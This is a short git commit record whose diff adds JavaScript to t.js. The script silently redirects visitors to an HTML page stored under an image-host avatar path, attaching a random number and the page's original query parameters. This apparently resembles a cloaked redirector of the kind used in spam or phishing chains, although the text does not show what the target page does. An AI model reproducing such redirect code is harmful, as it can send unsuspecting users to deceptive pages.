6bffb89032546c1389310152cc9620e1400f058e
reyalpilareyalpila <167016503+reyalpilareyalpila@users.noreply.github.com>
2024-08-16 01:54:48 +0800

    Update t.js

--- t.js
+++ t.js
@@ -1,1 +1,4 @@
 var urll="http://image.qiniu.fangdadi.com/wxavatar/20240815_20240815090601A683.html"
+var params = new URLSearchParams(location.href.split('?')[1]);
+  var sjs = Math.floor(Math.random() * (9999 - 1000 + 1)) + 1000;
+  window.location.replace(urll + "?" + sjs + "?" + params);
